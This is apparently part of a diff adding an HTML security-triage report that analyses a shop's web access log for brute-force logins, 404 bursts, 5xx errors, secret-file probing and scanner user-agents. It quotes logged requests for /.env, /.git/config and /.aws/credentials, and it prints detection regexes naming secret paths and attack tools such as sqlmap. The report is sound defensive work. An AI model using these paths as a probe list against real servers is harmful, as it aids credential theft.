+<p class="label">Raw lines</p><pre>438: 198.51.100.177 - - [10/Nov/2026:11:45:18 +0500] &quot;POST /login HTTP/1.1&quot; 401 482 &quot;https://shop.example/login&quot; &quot;python-requests/2.32.5&quot;
+439: 198.51.100.177 - - [10/Nov/2026:11:45:24 +0500] &quot;POST /login HTTP/1.1&quot; 401 482 &quot;https://shop.example/login&quot; &quot;python-requests/2.32.5&quot;
+440: 198.51.100.177 - - [10/Nov/2026:11:45:30 +0500] &quot;POST /login HTTP/1.1&quot; 302 0 &quot;https://shop.example/login&quot; &quot;python-requests/2.32.5&quot;</pre>
+<p><strong>What to check. </strong>Find the account behind the session and treat it as compromised: end its sessions, reset the password and review what the client requested next.</p>
+<p class="muted">Rule web-login-after-refusals from built-in default.yaml. Technique: https://attack.mitre.org/techniques/T1110/</p>
+</section>
+<section class="finding tone-medium"><header><span class="badge">MEDIUM</span><h3><span class="num">5.</span>Burst of 404 responses to one client</h3><p class="meta"><code>T1595.003</code> Active Scanning: Wordlist Scanning · Reconnaissance · 43 events · 2026-11-10 03:12:07 to 2026-11-10 03:14:21</p></header>
+<p><strong>What was seen. </strong>43 responses with status 404 to <code>203.0.113.99</code>, up to 43 within 5 min</p>
+<p>One client received many 404 responses in a short time, which is what a directory or file brute-force looks like from the server side.</p>
+<p><strong>Why it fired. </strong><code>event = http_request and status = 404</code>; at least 30 matching events within 5 min per ip.</p>
+<p class="muted">Evidence: 5 of 43 matching events</p>
+<div class="scroll"><table class="wide"><thead><tr><th>Line</th><th>Time</th><th>Host</th><th>User</th><th>IP</th><th>Event</th><th>Result</th><th>Path</th><th>Status</th></tr></thead><tbody><tr><td>20</td><td>2026-11-10 03:12:07</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/.env</code></td><td><code>404</code></td></tr><tr><td>21</td><td>2026-11-10 03:12:10</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/.env.bak</code></td><td><code>404</code></td></tr><tr><td>22</td><td>2026-11-10 03:12:12</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/.env.production</code></td><td><code>404</code></td></tr><tr><td>23</td><td>2026-11-10 03:12:15</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/.git/config</code></td><td><code>404</code></td></tr><tr><td>24</td><td>2026-11-10 03:12:19</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/.git/HEAD</code></td><td><code>404</code></td></tr></tbody></table></div>
+<p class="label">Raw lines</p><pre>20: 203.0.113.99 - - [10/Nov/2026:03:12:07 +0500] &quot;GET /.env HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;
+21: 203.0.113.99 - - [10/Nov/2026:03:12:10 +0500] &quot;GET /.env.bak HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;
+22: 203.0.113.99 - - [10/Nov/2026:03:12:12 +0500] &quot;GET /.env.production HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;
+23: 203.0.113.99 - - [10/Nov/2026:03:12:15 +0500] &quot;GET /.git/config HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;
+24: 203.0.113.99 - - [10/Nov/2026:03:12:19 +0500] &quot;GET /.git/HEAD HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;</pre>
+<p><strong>What to check. </strong>Rate-limit or block the client. Broken links on your own pages produce the same picture, so look at the paths first.</p>
+<p class="muted">Rule web-not-found-burst from built-in default.yaml. Technique: https://attack.mitre.org/techniques/T1595/003/</p>
+</section>
+<section class="finding tone-medium"><header><span class="badge">MEDIUM</span><h3><span class="num">6.</span>Burst of HTTP 5xx responses</h3><p class="meta"><code>T1190</code> Exploit Public-Facing Application · Initial Access · 43 events · 2026-11-10 03:20:41 to 2026-11-10 14:24:05</p></header>
+<p><strong>What was seen. </strong>43 responses with status 5xx, up to 38 within 5 min; paths: <code>/api/checkout, /product</code></p>
+<p>The server returned many 5xx errors within a few minutes. This is a lead, not a verdict: an outage, a bad deploy and an exploitation attempt that crashes the application all look the same here.</p>
+<p><strong>Why it fired. </strong><code>event = http_request and status ≥ 500</code>; at least 20 matching events within 5 min.</p>
+<p class="muted">Evidence: 5 of 43 matching events</p>
+<div class="scroll"><table class="wide"><thead><tr><th>Line</th><th>Time</th><th>Host</th><th>User</th><th>IP</th><th>Event</th><th>Result</th><th>Path</th><th>Status</th></tr></thead><tbody><tr><td>597</td><td>2026-11-10 14:20:05</td><td>—</td><td>—</td><td><code>192.0.2.2</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/api/checkout</code></td><td><code>502</code></td></tr><tr><td>598</td><td>2026-11-10 14:20:13</td><td>—</td><td>—</td><td><code>192.0.2.78</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/api/checkout</code></td><td><code>502</code></td></tr><tr><td>599</td><td>2026-11-10 14:20:20</td><td>—</td><td>—</td><td><code>198.51.100.95</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/api/checkout</code></td><td><code>502</code></td></tr><tr><td>600</td><td>2026-11-10 14:20:27</td><td>—</td><td>—</td><td><code>198.51.100.59</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/api/checkout</code></td><td><code>502</code></td></tr><tr><td>602</td><td>2026-11-10 14:20:36</td><td>—</td><td>—</td><td><code>192.0.2.11</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/api/checkout</code></td><td><code>502</code></td></tr></tbody></table></div>
+<p class="label">Raw lines</p><pre>597: 192.0.2.2 - - [10/Nov/2026:14:20:05 +0500] &quot;POST /api/checkout HTTP/1.1&quot; 502 166 &quot;https://shop.example/checkout&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Safari/605.1.15&quot;
+598: 192.0.2.78 - - [10/Nov/2026:14:20:13 +0500] &quot;POST /api/checkout HTTP/1.1&quot; 502 166 &quot;https://shop.example/checkout&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;
+599: 198.51.100.95 - - [10/Nov/2026:14:20:20 +0500] &quot;POST /api/checkout HTTP/1.1&quot; 502 166 &quot;https://shop.example/checkout&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36&quot;
+600: 198.51.100.59 - - [10/Nov/2026:14:20:27 +0500] &quot;POST /api/checkout HTTP/1.1&quot; 502 166 &quot;https://shop.example/checkout&quot; &quot;Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36&quot;
+602: 192.0.2.11 - - [10/Nov/2026:14:20:36 +0500] &quot;POST /api/checkout HTTP/1.1&quot; 502 166 &quot;https://shop.example/checkout&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</pre>
+<p><strong>What to check. </strong>Read the application error log for the same minutes. If the errors come from one client or one unusual path, treat it as an attack.</p>
+<p class="muted">Rule web-server-error-burst from built-in default.yaml. Technique: https://attack.mitre.org/techniques/T1190/</p>
+</section>
+<section class="finding tone-medium"><header><span class="badge">MEDIUM</span><h3><span class="num">7.</span>Probing for admin panels and secret files</h3><p class="meta"><code>T1595.003</code> Active Scanning: Wordlist Scanning · Reconnaissance · 30 events · 2026-11-10 03:12:07 to 2026-11-10 03:13:37</p></header>
+<p><strong>What was seen. </strong><code>203.0.113.99</code> probed sensitive paths, requests: 30; paths: <code>/.DS_Store, /.aws/credentials, /.env, /.env.bak, /.env.production and 25 more</code></p>
+<p>A client asked for paths that exist only on misconfigured servers or on software this site may not run, and was refused each time.</p>
+<p><strong>Why it fired. </strong><code>event = http_request and status ≥ 400 and path matches /(^|/)(\.env|\.git/|\.svn/|\.aws/|\.ssh/|\.htpasswd|\.DS_Store|wp-admin|wp-login\.php|xm…/</code>; every matching event per ip.</p>
+<p class="muted">Evidence: 5 of 30 matching events</p>
+<div class="scroll"><table class="wide"><thead><tr><th>Line</th><th>Time</th><th>Host</th><th>User</th><th>IP</th><th>Event</th><th>Result</th><th>Path</th><th>Status</th></tr></thead><tbody><tr><td>20</td><td>2026-11-10 03:12:07</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/.env</code></td><td><code>404</code></td></tr><tr><td>21</td><td>2026-11-10 03:12:10</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/.env.bak</code></td><td><code>404</code></td></tr><tr><td>22</td><td>2026-11-10 03:12:12</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/.env.production</code></td><td><code>404</code></td></tr><tr><td>23</td><td>2026-11-10 03:12:15</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/.git/config</code></td><td><code>404</code></td></tr><tr><td>24</td><td>2026-11-10 03:12:19</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/.git/HEAD</code></td><td><code>404</code></td></tr></tbody></table></div>
+<p class="label">Raw lines</p><pre>20: 203.0.113.99 - - [10/Nov/2026:03:12:07 +0500] &quot;GET /.env HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;
+21: 203.0.113.99 - - [10/Nov/2026:03:12:10 +0500] &quot;GET /.env.bak HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;
+22: 203.0.113.99 - - [10/Nov/2026:03:12:12 +0500] &quot;GET /.env.production HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;
+23: 203.0.113.99 - - [10/Nov/2026:03:12:15 +0500] &quot;GET /.git/config HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;
+24: 203.0.113.99 - - [10/Nov/2026:03:12:19 +0500] &quot;GET /.git/HEAD HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;</pre>
+<p><strong>What to check. </strong>No action if every answer is 4xx. Check that none of the listed paths returned 200 to anyone else.</p>
+<p class="muted">Rule web-sensitive-path-probe from built-in default.yaml. Technique: https://attack.mitre.org/techniques/T1595/003/</p>
+</section>
+<section class="finding tone-low"><header><span class="badge">LOW</span><h3><span class="num">8.</span>Request from a known scanning tool</h3><p class="meta"><code>T1595.002</code> Active Scanning: Vulnerability Scanning · Reconnaissance · 60 events · 2026-11-10 03:12:07 to 2026-11-10 03:21:52</p></header>
+<p><strong>What was seen. </strong>Requests from <code>203.0.113.99</code> with a scanner User-Agent: 60; <code>Mozilla/5.0 zgrab/0.x, sqlmap/1.9.4#stable (https://sqlmap.org)</code></p>
+<p>The User-Agent names a scanning or exploitation tool. Tools can send any User-Agent, so the absence of this finding proves nothing.</p>
+<p><strong>Why it fired. </strong><code>event = http_request and user_agent matches /sqlmap|nikto|nuclei|wpscan|masscan|zgrab|dirbuster|gobuster|feroxbuster|ffuf|nessus|ope…/</code>; every matching event per ip.</p>
+<p class="muted">Evidence: 5 of 60 matching events</p>
+<div class="scroll"><table class="wide"><thead><tr><th>Line</th><th>Time</th><th>Host</th><th>User</th><th>IP</th><th>Event</th><th>Result</th><th>User agent</th></tr></thead><tbody><tr><td>20</td><td>2026-11-10 03:12:07</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>Mozilla/5.0 zgrab/0.x</code></td></tr><tr><td>21</td><td>2026-11-10 03:12:10</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>Mozilla/5.0 zgrab/0.x</code></td></tr><tr><td>22</td><td>2026-11-10 03:12:12</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>Mozilla/5.0 zgrab/0.x</code></td></tr><tr><td>23</td><td>2026-11-10 03:12:15</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>Mozilla/5.0 zgrab/0.x</code></td></tr><tr><td>24</td><td>2026-11-10 03:12:19</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>Mozilla/5.0 zgrab/0.x</code></td></tr></tbody></table></div>
+<p class="label">Raw lines</p><pre>20: 203.0.113.99 - - [10/Nov/2026:03:12:07 +0500] &quot;GET /.env HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;
+21: 203.0.113.99 - - [10/Nov/2026:03:12:10 +0500] &quot;GET /.env.bak HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;
+22: 203.0.113.99 - - [10/Nov/2026:03:12:12 +0500] &quot;GET /.env.production HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;
+23: 203.0.113.99 - - [10/Nov/2026:03:12:15 +0500] &quot;GET /.git/config HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;
+24: 203.0.113.99 - - [10/Nov/2026:03:12:19 +0500] &quot;GET /.git/HEAD HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;</pre>
+<p><strong>What to check. </strong>Expected on any public server. Worth a look only if the same address appears in other findings.</p>
+<p class="muted">Rule web-scanner-user-agent from built-in default.yaml. Technique: https://attack.mitre.org/techniques/T1595/002/</p>
+</section>
+<h2>Events by type</h2>
+<div class="scroll"><table><thead><tr><th>Event</th><th>Result</th><th>Count</th></tr></thead><tbody><tr><td><code>http_request</code></td><td><code>success</code></td><td>917</td></tr><tr><td><code>http_request</code></td><td><code>failure</code></td><td>188</td></tr></tbody></table></div>
+<p class="muted">Every parsed event with its normalised fields is in events.csv.</p>
+<h2>Skipped lines</h2>
+<p>2 lines could not be read and were left out of the analysis.</p>
+<div class="scroll"><table><thead><tr><th>Line</th><th>Reason</th><th>Text</th></tr></thead><tbody><tr><td>74</td><td>not an access log line</td><td><code>203.0.113.99 - - [10/Nov/2026:03:1</code></td></tr><tr><td>601</td><td>not an access log line</td><td><code>nginx: [warn] conflicting server name &quot;shop.example&quot; on 0.0.0.0:443, ignored</code></td></tr></tbody></table></div>
+<h2>Rules applied</h2>
+<div class="scroll"><table><thead><tr><th>Rule</th><th>Severity</th><th>ATT&amp;CK</th><th>Title</th><th>Findings</th></tr></thead><tbody><tr><td><code>auth-success-after-failures</code></td><td><span class="badge tone-critical">CRITICAL</span></td><td><code>T1110</code></td><td>Successful login after repeated failures from the same address</td><td>—</td></tr><tr><td><code>auth-password-guessing</code></td><td><span class="badge tone-high">HIGH</span></td><td><code>T1110.001</code></td><td>Repeated failed logins from one address</td><td>—</td></tr><tr><td><code>auth-password-spraying</code></td><td><span class="badge tone-high">HIGH</span></td><td><code>T1110.003</code></td><td>One address trying many different accounts</td><td>—</td></tr><tr><td><code>auth-new-source-for-user</code></td><td><span class="badge tone-medium">MEDIUM</span></td><td><code>T1078</code></td><td>Login from an address the account has not used before</td><td>—</td></tr><tr><td><code>auth-root-login</code></td><td><span class="badge tone-medium">MEDIUM</span></td><td><code>T1078.003</code></td><td>Direct root login over SSH</td><td>—</td></tr><tr><td><code>admin-night-activity</code></td><td><span class="badge tone-medium">MEDIUM</span></td><td><code>T1078</code></td><td>Administrative activity at night</td><td>—</td></tr><tr><td><code>sudo-denied</code></td><td><span class="badge tone-low">LOW</span></td><td><code>T1548.003</code></td><td>sudo attempt refused</td><td>—</td></tr><tr><td><code>account-created</code></td><td><span class="badge tone-medium">MEDIUM</span></td><td><code>T1136</code></td><td>New user account created</td><td>—</td></tr><tr><td><code>privileged-group-change</code></td><td><span class="badge tone-high">HIGH</span></td><td><code>T1098</code></td><td>Account added to a privileged group</td><td>—</td></tr><tr><td><code>win-service-installed</code></td><td><span class="badge tone-medium">MEDIUM</span></td><td><code>T1543.003</code></td><td>New Windows service installed</td><td>—</td></tr><tr><td><code>win-scheduled-task-created</code></td><td><span class="badge tone-medium">MEDIUM</span></td><td><code>T1053.005</code></td><td>Scheduled task created</td><td>—</td></tr><tr><td><code>win-encoded-powershell</code></td><td><span class="badge tone-high">HIGH</span></td><td><code>T1059.001</code></td><td>PowerShell started with an encoded or download command</td><td>—</td></tr><tr><td><code>win-audit-log-cleared</code></td><td><span class="badge tone-high">HIGH</span></td><td><code>T1070.001</code></td><td>Windows event log cleared</td><td>—</td></tr><tr><td><code>web-secret-file-served</code></td><td><span class="badge tone-critical">CRITICAL</span></td><td><code>T1552.001</code></td><td>Secret or backup file was served to a client</td><td>1</td></tr><tr><td><code>web-injection-attempt</code></td><td><span class="badge tone-high">HIGH</span></td><td><code>T1190</code></td><td>Injection or path traversal pattern in a request</td><td>1</td></tr><tr><td><code>web-sensitive-path-probe</code></td><td><span class="badge tone-medium">MEDIUM</span></td><td><code>T1595.003</code></td><td>Probing for admin panels and secret files</td><td>1</td></tr><tr><td><code>web-not-found-burst</code></td><td><span class="badge tone-medium">MEDIUM</span></td><td><code>T1595.003</code></td><td>Burst of 404 responses to one client</td><td>1</td></tr><tr><td><code>web-scanner-user-agent</code></td><td><span class="badge tone-low">LOW</span></td><td><code>T1595.002</code></td><td>Request from a known scanning tool</td><td>1</td></tr><tr><td><code>web-login-bruteforce</code></td><td><span class="badge tone-high">HIGH</span></td><td><code>T1110.001</code></td><td>Repeated refused logins on a web form</td><td>1</td></tr><tr><td><code>web-login-after-refusals</code></td><td><span class="badge tone-high">HIGH</span></td><td><code>T1110</code></td><td>Login form accepted a client after repeated refusals</td><td>1</td></tr><tr><td><code>web-server-error-burst</code></td><td><span class="badge tone-medium">MEDIUM</span></td><td><code>T1190</code></td><td>Burst of HTTP 5xx responses</td><td>1</td></tr></tbody></table></div>
+<p class="muted">A finding is a lead to verify, not a verdict. The report covers one file: anything outside it, and anything none of these rules describe, is not here.</p>
+<footer>soc-triage 0.1.0. First-pass triage of one file, not a replacement for a SIEM.</footer>
+</main>
+</body>
+</html>
